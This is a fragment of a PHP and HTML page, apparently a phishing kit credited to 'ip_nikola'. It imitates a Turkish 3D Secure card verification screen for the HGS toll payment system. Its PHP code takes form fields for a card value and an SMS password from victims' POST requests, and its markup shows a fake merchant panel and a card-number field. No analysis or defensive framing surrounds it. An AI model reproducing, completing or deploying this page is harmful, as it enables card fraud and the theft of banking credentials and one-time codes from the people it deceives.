...
if($_POST){
	$kk = strip_tags($_POST['kk']);

$sms = strip_tags($_POST['password']);
...
<html>
<!-- Coded By ip_nikola -->
<html lang="tr" style="height: 100%; width: 100%;"><head><meta http-equiv="Content-Type" content="text/html; charset=WINDOWS-1254">
        ...
        <div class="content">
          ...
          <div class="info-wrapper">
            <div class="info-row">
              ...
              <div class="info-col" 3dsdisplay="merchant" id="merchant-name">Hizli Gecis Sistemi (HGS)</div>
            </div>
            <div class="info-row">
              <div class="info-col info-label">Kart Numarası:</div>
              <div class="info-col" 3dsdisplay="pan" id="pan">XXXX XXXX XXXX XXXX </div>
            </div>
          </div>
